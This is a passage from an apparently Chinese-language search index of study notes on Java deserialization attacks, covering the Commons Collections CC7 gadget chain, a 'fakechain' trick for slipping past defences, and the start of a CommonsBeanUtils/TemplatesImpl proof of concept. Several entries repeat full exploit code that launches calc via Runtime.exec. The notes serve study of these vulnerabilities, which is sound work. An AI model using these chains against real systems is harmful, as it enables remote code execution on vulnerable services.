FileInputStream(\"./cc7\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } \u5728Hashtable#readObject\u4e2d\u5b58\u5728\u5982\u4e0b\u4ee3\u7801\u5757 \u5b58\u5728\u65b9\u6cd5reconstitutionPut\uff0c\u8fdb\u884c\u8ddf\u8fdb \u8fd9\u91cc\u4f1a\u5c06\u4e24\u4e2aLazyMap\u7528AbstractMapDecorator#equals \u8fdb\u884c\u6bd4\u8f83\u3002\u8fd9\u91cc\u7684\u4e24\u4e2akey\u503c\u5c31\u5206\u522b\u4ee3\u8868\u7740\u4e24\u4e2aLazyMap\u3002 \u8ddf\u8fdb\u540e\u53d1\u73b0\u53c8\u6709\u4e00\u4e2aequals\u65b9\u6cd5\uff0c\u8ddf\u8fdb\u6765\u5230AbstractMap#equals \u53d1\u73b0\u4f1a\u5bf9\u4f20\u5165\u7684TiedMapEntry\u8c03\u7528get\u65b9\u6cd5 \u8fd9\u6837\u770b\uff0c\u94fe\u5c31\u660e\u4e86\u4e86\u3002 POC\u5206\u67901 Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain); lazyMap1.put(\"yy\", 1); Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain); lazyMap2.put(\"zZ\", 1); \u6211\u4eec\u53d1\u73b0\u6b64\u5904put\u7684\u503c\u662fyy\u548czZ\uff0c\u6211\u4eec\u5982\u679cput\u5176\u4ed6\u503c\u7684\u8bdd\u662f\u4e0d\u80fd\u5b8c\u6210\u8fd9\u6761\u94fe\u7684\u3002\u6211\u4eec\u770b\u8fd9\u4e2a\u5730\u65b9\u3002 hash\u65b9\u6cd5\u5728\u8fd9\u91cc\u4f1a\u83b7\u53d6key\u503c\uff08\u5728\u8fd9\u91cc\u5c31\u662fLazyMap\u5bf9\u8c61\uff09\u7684key\u503c\u7684hash\u3002 \u6240\u4ee5\u8fd9\u91cc\u4f1a\u5224\u65adhashtable\u4e2d\u7684\u4e24\u4e2akey\u503c\uff08\u4e5f\u5c31\u662f\u4e24\u4e2aLazyMap\u5bf9\u8c61\uff09\u7684key\u503chash\u662f\u5426\u76f8\u540c\uff0c\u53ea\u6709\u76f8\u540c\u624d\u80fd\u4e0b\u4e00\u6b65\u3002 \u800cyy\u548czZ\u7684hash\u503c\u5728java\u4e2d\u662f\u76f8\u540c\u7684 \u8fd9\u4e2a\u65f6\u5019\u53ef\u80fd\u4f1a\u6709\u7591\u95ee\uff0c\u4e3a\u4ec0\u4e48LazyMap\u7684key\u503c\u4e0d\u80fd\u8bbe\u6210\u4e00\u6837\u7684\u5462\uff1f\u56e0\u4e3a\u8bbe\u6210\u4e00\u6837\u7684\u4f1a\u9020\u6210\u5982\u4e0b\u95ee\u9898 \u5728readObject\u65f6\u4f1a\u9020\u6210elements\u5143\u7d20\u7684\u503c\u4e3a1 elements\u503c\u4e3a1\uff0c\u5219\u5728\u6b64\u5904\u53ea\u80fd\u8fdb\u884c\u4e00\u6b21\u5faa\u73af\uff0c\u5bfc\u81f4Hashtable#equals\u65b9\u6cd5\u4e0d\u80fd\u88ab\u6267\u884c\uff08Hashtable#equals\u65b9\u6cd5\u9700\u8981\u81f3\u5c11\u4e24\u4e2ahashtable\u4e2d\u7684key\u503c\u624d\u80fd\u6267\u884c\uff0c\u5177\u4f53\u903b\u8f91\u89c1\u4e0a\u6587\uff09\u3002 POC\u5206\u67902 Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 1); hashtable.put(lazyMap2, 2); lazyMap2.remove(\"yy\"); \u6211\u4eec\u5728\u5e8f\u5217\u5316\u524d\u5bf9hashtable\u8fdb\u884c\u7b2c\u4e8c\u6b21put\u64cd\u4f5c\u65f6\uff0c\u4e5f\u4f1a\u8c03\u7528equals\u65b9\u6cd5 \u4ece\u800c\u4f1a\u89e6\u53d1lazymap2\u7684get\u65b9\u6cd5\uff0c\u6211\u4eec\u8fd9\u91cc\u4f1a\u53d1\u73b0\u8c03\u7528\u4e86put\u65b9\u6cd5\u5411lazymap2\u589e\u52a0\u4e86\u952e\u503c\u5bf9\u3002 \u8fdb\u800c\u5bfc\u81f4lazymap2\u7684\u7ed3\u6784\u53d8\u6210\u4e86\u8fd9\u6837 \u53ef\u4ee5\u53d1\u73b0\u5728value\u5904\u5b58\u5728\u4e00\u4e2aProcessImpl\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u6ca1\u6709\u5b9e\u73b0\u5e8f\u5217\u5316\u63a5\u53e3\uff0c\u4e0d\u80fd\u88ab\u5e8f\u5217\u5316\uff0c\u6240\u4ee5\u5982\u679c\u6ca1\u6709lazymap2.remove(\"yy\")\uff0c\u5c31\u4f1a\u5bfc\u81f4\u5728\u5e8f\u5217\u5316\u65f6\u51fa\u73b0\u9519\u8bef\u3002 \u6240\u4ee5\u901a\u8fc7lazymap2.remove(\"yy\")\uff0c\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5254\u9664\u5728hashtable#put\u65f6\u6dfb\u52a0\u8fdblazymap2\u4e2d\u7684\u4e0d\u53ef\u5e8f\u5217\u5316\u7684\u5bf9\u8c61\uff0c\u5b9e\u73b0\u5e8f\u5217\u5316\u3002","title":"Apache-Commons-Collections 7"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%207/Apache-Commons-Collections%207/#apache-commons-collections-7","text":"","title":"Apache-Commons-Collections 7"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%207/Apache-Commons-Collections%207/#_1","text":"\u7248\u672c \u5229\u7528\u94fe POC\u5206\u67901 POC\u5206\u67902","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%207/Apache-Commons-Collections%207/#_2","text":"CommonsCollections 3.1 - 3.2.1","title":"\u7248\u672c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%207/Apache-Commons-Collections%207/#_3","text":"HashTable.readObject() HashTable.reconstitutionPut() AbstractMapDecorator.equals() AbstractMap.equals() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() POC import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.*; public class Main { public static void main(String[] args) throws Exception { ChainedTransformer transformerChain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"calc\"})}); Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain); lazyMap1.put(\"yy\", 1); Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain); lazyMap2.put(\"zZ\", 1); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 1); hashtable.put(lazyMap2, 2); lazyMap2.remove(\"yy\"); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc7\")); outputStream.writeObject(hashtable); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc7\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } \u5728Hashtable#readObject\u4e2d\u5b58\u5728\u5982\u4e0b\u4ee3\u7801\u5757 \u5b58\u5728\u65b9\u6cd5reconstitutionPut\uff0c\u8fdb\u884c\u8ddf\u8fdb \u8fd9\u91cc\u4f1a\u5c06\u4e24\u4e2aLazyMap\u7528AbstractMapDecorator#equals \u8fdb\u884c\u6bd4\u8f83\u3002\u8fd9\u91cc\u7684\u4e24\u4e2akey\u503c\u5c31\u5206\u522b\u4ee3\u8868\u7740\u4e24\u4e2aLazyMap\u3002 \u8ddf\u8fdb\u540e\u53d1\u73b0\u53c8\u6709\u4e00\u4e2aequals\u65b9\u6cd5\uff0c\u8ddf\u8fdb\u6765\u5230AbstractMap#equals \u53d1\u73b0\u4f1a\u5bf9\u4f20\u5165\u7684TiedMapEntry\u8c03\u7528get\u65b9\u6cd5 \u8fd9\u6837\u770b\uff0c\u94fe\u5c31\u660e\u4e86\u4e86\u3002","title":"\u5229\u7528\u94fe"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%207/Apache-Commons-Collections%207/#poc1","text":"Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain); lazyMap1.put(\"yy\", 1); Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain); lazyMap2.put(\"zZ\", 1); \u6211\u4eec\u53d1\u73b0\u6b64\u5904put\u7684\u503c\u662fyy\u548czZ\uff0c\u6211\u4eec\u5982\u679cput\u5176\u4ed6\u503c\u7684\u8bdd\u662f\u4e0d\u80fd\u5b8c\u6210\u8fd9\u6761\u94fe\u7684\u3002\u6211\u4eec\u770b\u8fd9\u4e2a\u5730\u65b9\u3002 hash\u65b9\u6cd5\u5728\u8fd9\u91cc\u4f1a\u83b7\u53d6key\u503c\uff08\u5728\u8fd9\u91cc\u5c31\u662fLazyMap\u5bf9\u8c61\uff09\u7684key\u503c\u7684hash\u3002 \u6240\u4ee5\u8fd9\u91cc\u4f1a\u5224\u65adhashtable\u4e2d\u7684\u4e24\u4e2akey\u503c\uff08\u4e5f\u5c31\u662f\u4e24\u4e2aLazyMap\u5bf9\u8c61\uff09\u7684key\u503chash\u662f\u5426\u76f8\u540c\uff0c\u53ea\u6709\u76f8\u540c\u624d\u80fd\u4e0b\u4e00\u6b65\u3002 \u800cyy\u548czZ\u7684hash\u503c\u5728java\u4e2d\u662f\u76f8\u540c\u7684 \u8fd9\u4e2a\u65f6\u5019\u53ef\u80fd\u4f1a\u6709\u7591\u95ee\uff0c\u4e3a\u4ec0\u4e48LazyMap\u7684key\u503c\u4e0d\u80fd\u8bbe\u6210\u4e00\u6837\u7684\u5462\uff1f\u56e0\u4e3a\u8bbe\u6210\u4e00\u6837\u7684\u4f1a\u9020\u6210\u5982\u4e0b\u95ee\u9898 \u5728readObject\u65f6\u4f1a\u9020\u6210elements\u5143\u7d20\u7684\u503c\u4e3a1 elements\u503c\u4e3a1\uff0c\u5219\u5728\u6b64\u5904\u53ea\u80fd\u8fdb\u884c\u4e00\u6b21\u5faa\u73af\uff0c\u5bfc\u81f4Hashtable#equals\u65b9\u6cd5\u4e0d\u80fd\u88ab\u6267\u884c\uff08Hashtable#equals\u65b9\u6cd5\u9700\u8981\u81f3\u5c11\u4e24\u4e2ahashtable\u4e2d\u7684key\u503c\u624d\u80fd\u6267\u884c\uff0c\u5177\u4f53\u903b\u8f91\u89c1\u4e0a\u6587\uff09\u3002","title":"POC\u5206\u67901"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%207/Apache-Commons-Collections%207/#poc2","text":"Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 1); hashtable.put(lazyMap2, 2); lazyMap2.remove(\"yy\"); \u6211\u4eec\u5728\u5e8f\u5217\u5316\u524d\u5bf9hashtable\u8fdb\u884c\u7b2c\u4e8c\u6b21put\u64cd\u4f5c\u65f6\uff0c\u4e5f\u4f1a\u8c03\u7528equals\u65b9\u6cd5 \u4ece\u800c\u4f1a\u89e6\u53d1lazymap2\u7684get\u65b9\u6cd5\uff0c\u6211\u4eec\u8fd9\u91cc\u4f1a\u53d1\u73b0\u8c03\u7528\u4e86put\u65b9\u6cd5\u5411lazymap2\u589e\u52a0\u4e86\u952e\u503c\u5bf9\u3002 \u8fdb\u800c\u5bfc\u81f4lazymap2\u7684\u7ed3\u6784\u53d8\u6210\u4e86\u8fd9\u6837 \u53ef\u4ee5\u53d1\u73b0\u5728value\u5904\u5b58\u5728\u4e00\u4e2aProcessImpl\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u6ca1\u6709\u5b9e\u73b0\u5e8f\u5217\u5316\u63a5\u53e3\uff0c\u4e0d\u80fd\u88ab\u5e8f\u5217\u5316\uff0c\u6240\u4ee5\u5982\u679c\u6ca1\u6709lazymap2.remove(\"yy\")\uff0c\u5c31\u4f1a\u5bfc\u81f4\u5728\u5e8f\u5217\u5316\u65f6\u51fa\u73b0\u9519\u8bef\u3002 \u6240\u4ee5\u901a\u8fc7lazymap2.remove(\"yy\")\uff0c\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5254\u9664\u5728hashtable#put\u65f6\u6dfb\u52a0\u8fdblazymap2\u4e2d\u7684\u4e0d\u53ef\u5e8f\u5217\u5316\u7684\u5bf9\u8c61\uff0c\u5b9e\u73b0\u5e8f\u5217\u5316\u3002","title":"POC\u5206\u67902"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/%E4%B8%80%E4%BA%9Btrick/%E4%B8%80%E4%BA%9Btrick/","text":"\u4e00\u4e9btrick \u76ee\u5f55 fakechain fakechain fakechain\u662f\u4e00\u79cd\u5bf9\u5b89\u5168\u9632\u62a4Bypass\u7684\u4e00\u79cd\u624b\u6bb5\u3002 \u7ed9Lazymap\u6216\u8005TransformerMap \u8bbe\u7f6eChainedTransformer \u5bf9\u8c61\u65f6\uff0c\u53ef\u4ee5\u5728\u5176\u4e2d\u5148\u653e\u7f6e\u4e00\u4e2a\u7a7a\u7684Transformer\u5bf9\u8c61\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u524d\u6700\u540e\u4e00\u6b65\u518d\u901a\u8fc7\u53cd\u5c04\u5c06ChainedTransformer \u5bf9\u8c61\u5185\u90e8\u7684 itransformer \u5c5e\u6027\u6539\u56de\u5230\u771f\u6b63\u7684chain\u3002\uff08 itransformer \u5c5e\u6027\u662fChainedTransformer \u5185\u90e8\u5b58\u50a8Transformer\u5bf9\u8c61\u7684\u6570\u7ec4\uff09 \u4ee5CC1\u4e3a\u4f8b\u3002 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.annotation.Retention; import java.lang.reflect.*; import java.util.HashMap; import java.util.Map; public class Main { public static void main(String[] args) throws Exception { //\u5b9a\u4e49\u4e24\u4e2achain Transformer[] chain= new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"calc.exe\"})}; Transformer[] fakechain = new Transformer[]{}; //\u5b9a\u4e49\u4e00\u4e2aChainedTransformer \uff0c\u5e76\u4f20\u5165fakechain ChainedTransformer chainedTransformer = new ChainedTransformer(fakechain); Map innermap = new HashMap(); Map outermap = LazyMap.decorate(innermap, chainedTransformer); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class); cons.setAccessible(true); InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,outermap); Map Prox = (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler); InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class,Prox); //\u901a\u8fc7\u53cd\u5c04\u4fee\u6539chainedTransformer\u5bf9\u8c61\u7684itransformers Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, chain); ObjectOutputStream a = new ObjectOutputStream(new FileOutputStream(\"a.bin\")); a.writeObject(handler1); ObjectInputStream b = new ObjectInputStream(new FileInputStream(\"a.bin\")); b.readObject(); } } \u53e6\u5916\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u9632\u6b62\u5728\u53cd\u5e8f\u5217\u5316\u524d\u8c03\u7528ChainedTransformer\u5185\u90e8\u7684chain\u89e6\u53d1\u547d\u4ee4\u6267\u884c\uff0c\u5728\u5206\u6790\u4ee3\u7801\u7684\u65f6\u5019\u80fd\u591f\u8d77\u5230\u4e00\u5b9a\u7684\u5e2e\u52a9\uff08\u51cf\u5c11\u5e72\u6270\uff09\u3002","title":"\u4e00\u4e9btrick"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/%E4%B8%80%E4%BA%9Btrick/%E4%B8%80%E4%BA%9Btrick/#trick","text":"","title":"\u4e00\u4e9btrick"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/%E4%B8%80%E4%BA%9Btrick/%E4%B8%80%E4%BA%9Btrick/#_1","text":"fakechain","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/%E4%B8%80%E4%BA%9Btrick/%E4%B8%80%E4%BA%9Btrick/#fakechain","text":"fakechain\u662f\u4e00\u79cd\u5bf9\u5b89\u5168\u9632\u62a4Bypass\u7684\u4e00\u79cd\u624b\u6bb5\u3002 \u7ed9Lazymap\u6216\u8005TransformerMap \u8bbe\u7f6eChainedTransformer \u5bf9\u8c61\u65f6\uff0c\u53ef\u4ee5\u5728\u5176\u4e2d\u5148\u653e\u7f6e\u4e00\u4e2a\u7a7a\u7684Transformer\u5bf9\u8c61\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u524d\u6700\u540e\u4e00\u6b65\u518d\u901a\u8fc7\u53cd\u5c04\u5c06ChainedTransformer \u5bf9\u8c61\u5185\u90e8\u7684 itransformer \u5c5e\u6027\u6539\u56de\u5230\u771f\u6b63\u7684chain\u3002\uff08 itransformer \u5c5e\u6027\u662fChainedTransformer \u5185\u90e8\u5b58\u50a8Transformer\u5bf9\u8c61\u7684\u6570\u7ec4\uff09 \u4ee5CC1\u4e3a\u4f8b\u3002 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.annotation.Retention; import java.lang.reflect.*; import java.util.HashMap; import java.util.Map; public class Main { public static void main(String[] args) throws Exception { //\u5b9a\u4e49\u4e24\u4e2achain Transformer[] chain= new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"calc.exe\"})}; Transformer[] fakechain = new Transformer[]{}; //\u5b9a\u4e49\u4e00\u4e2aChainedTransformer \uff0c\u5e76\u4f20\u5165fakechain ChainedTransformer chainedTransformer = new ChainedTransformer(fakechain); Map innermap = new HashMap(); Map outermap = LazyMap.decorate(innermap, chainedTransformer); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class); cons.setAccessible(true); InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,outermap); Map Prox = (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler); InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class,Prox); //\u901a\u8fc7\u53cd\u5c04\u4fee\u6539chainedTransformer\u5bf9\u8c61\u7684itransformers Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, chain); ObjectOutputStream a = new ObjectOutputStream(new FileOutputStream(\"a.bin\")); a.writeObject(handler1); ObjectInputStream b = new ObjectInputStream(new FileInputStream(\"a.bin\")); b.readObject(); } } \u53e6\u5916\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u9632\u6b62\u5728\u53cd\u5e8f\u5217\u5316\u524d\u8c03\u7528ChainedTransformer\u5185\u90e8\u7684chain\u89e6\u53d1\u547d\u4ee4\u6267\u884c\uff0c\u5728\u5206\u6790\u4ee3\u7801\u7684\u65f6\u5019\u80fd\u591f\u8d77\u5230\u4e00\u5b9a\u7684\u5e2e\u52a9\uff08\u51cf\u5c11\u5e72\u6270\uff09\u3002","title":"fakechain"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CommonsBeanUtils%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","text":"CommonsBeanUtils \u53cd\u5e8f\u5217\u5316 \u76ee\u5f55 \u4e86\u89e3Apache Commons BeanUtils \u7684\u529f\u80fd BeanUtils \u4e0e TemplatesImpl Poc \u603b\u7ed3 \u5728CC2\u8fd9\u6761\u94fe\u4e2d\uff0c\u4e3b\u8981\u662f\u901a\u8fc7\u5411java.util.PriorityQueue\u5bf9\u8c61\u4f20\u5165\u6076\u610fjava.util.Comparator\u5bf9\u8c61\uff0c\u5bfc\u81f4\u5728PriorityQueue\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u6267\u884c\u4e86\u6076\u610fjava.util.Comparator\u7684compare\u65b9\u6cd5\u3002 \u800cjava.util.Comparator\u5b9e\u9645\u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u6211\u4eec\u5728CC2\u4e2d\u4f20\u5165\u7684\u662f\u5b83\u7684\u4e00\u4e2a\u7ee7\u627f\u7c7b\uff1aTransformingComparator\u3002\u90a3\u4e48\u9664\u4e86TransformingComparator \u4ee5\u5916\u8fd8\u6709\u6ca1\u6709\u5176\u5b83\u80fd\u591f\u9020\u6210\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684java.util.Comparator\u5b9e\u73b0\u5bf9\u8c61\u5462\uff1f \u4e86\u89e3Apache Commons BeanUtils \u7684\u529f\u80fd Apache Commons\u5de5\u5177\u96c6\u4e0b\u9664\u4e86collections\u4ee5\u5916\u8fd8\u6709BeanUtils \uff0c\u5b83\u4e3b\u8981\u7528\u4e8e\u64cd\u63a7javabean\u3002 \u4e3e\u4e2a\u4e0e\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u6709\u5173\u7684\u64cd\u63a7javabean\u7684\u4f8b\u5b50\u3002 \u8fd9\u91cc\u76f4\u63a5\u5957\u7528p\u725b\u7684\u4f8b\u5b50\u3002 final public class Cat { private String name = \"catalina\"; public String getName() { System.out.println(\"123\"); return name; } public void setName(String name) { this.name = name; } } \u7136\u540e\u6211\u4eec\u6267\u884c PropertyUtils.getProperty(new Cat(), \"name\"); \u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u8c03\u7528\u76ee\u6807\u7c7b\u7684\u76f8\u5173\u5c5e\u6027\u7684getter\u65b9\u6cd5\uff0c\u4e5f\u5c31\u662fCat\u7c7b\u4e2d\u7684getName\u65b9\u6cd5\uff0c\u6240\u4ee5\u8f93\u51fa\u7ed3\u679c\u5982\u4e0b BeanUtils \u4e0e TemplatesImpl \u6211\u4eec\u901a\u8fc7\u4e0a\u9762\u7684\u53d9\u8ff0\uff0c\u77e5\u9053\u4e86BeanUtils \u5982\u4f55\u8c03\u7528\u76ee\u6807\u7c7b\u67d0\u5c5e\u6027\u7684getter\u65b9\u6cd5\u3002 \u800c\u5728TemplatesImpl\u4e2d\u6709\u5982\u4e0b\u7684\u94fe\uff1aTemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass() -> \u6076\u610f\u7c7b\u521d\u59cb\u5316 \u540c\u65f6\u5728TemplatesImpl\u4e2d\u5b58\u5728\u5982\u4e0b\u65b9\u6cd5TemplatesImpl#getOutputProperties() \u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u5b83\u8c03\u7528\u4e86newTransformer\u5e76\u4e14\u662f\u4e00\u4e2agetter\u65b9\u6cd5\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u60f3\u529e\u6cd5\u7528BeanUtils\u7684PropertyUtils#getProperty\u8c03\u7528\u8be5\u65b9\u6cd5\u4ece\u800c\u5f00\u542fTemplatesImpl\u94fe\uff0c\u4ece\u800c\u6267\u884c\u6076\u610f\u5b57\u8282\u7801\u3002 BeanUtils\u5b58\u5728\u5982\u4e0b\u5305 org.apache.commons.beanutils.BeanComparator\uff0c\u5b83\u7ee7\u627f\u81eajava.util.Comparator\u63a5\u53e3\uff0c\u6240\u4ee5\u5b9e\u73b0\u4e86compare\u65b9\u6cd5\uff1a \u5982\u679c\u4f20\u5165\u4e24\u4e2a\u5bf9\u8c61\u65f6 this.property\u4e0d\u4e3a\u7a7a\uff0c\u5c31\u4f1a\u5206\u522b\u5bf9\u4e24\u4e2a\u5bf9\u8c61\u8c03\u7528PropertyUtils.getProperty\u4ece\u800c\u89e6\u53d1\u5176\u5bf9\u5e94getter\u65b9\u6cd5\u3002 \u7531\u6b64\u6765\u770b\uff0c\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2aBeanComparator\u7c7b\uff0c\u901a\u8fc7\u53cd\u5c04\u7b49\u624b\u6bb5\u5c06\u5176property\u5c5e\u6027\u6539\u6210OutputProperties\uff0c\u518d\u4f7f\u5176\u52a0\u8f7d\u8fdbjava.util.PriorityQueue\uff0c\u5728java.util.PriorityQueue\u53cd\u5e8f\u5217\u5316\u65f6\u81ea\u52a8\u8c03\u7528BeanComparator#compare\uff0c\u8fd9\u4e2a\u65f6\u5019\u60f3\u529e\u6cd5\u5c06\u4f20\u5165\u8be5\u65b9\u6cd5\u7684\u5bf9\u8c61\u6539\u6210\u6076\u610fTemplatesImpl\uff0c\u4f7fPropertyUtils.getProperty\u89e6\u53d1getOutputProperties\u8fd9\u4e2agetter\u65b9\u6cd5\uff0c\u5373\u53ef\u8fbe\u5230\u6076\u610f\u5b57\u8282\u7801\u6267\u884c\u7684\u6548\u679c\u3002 \u5149\u8bf4\u80af\u5b9a\u4f1a\u89c9\u5f97\u62bd\u8c61\uff0c\u4e0b\u9762\u76f4\u63a5\u4e0a\u4ee3\u7801\uff0c\u5176\u4e2d\u5927\u90e8\u5206\u5185\u5bb9\u4e0eCC2\u91cd\u5408\uff0c\u91cd\u5408\u90e8\u5206\u7684\u63cf\u8ff0\u56e0\u6b64\u7565\u8fc7\u3002 Poc import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.*; import org.apache.commons.beanutils.BeanComparator; public class Main { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + 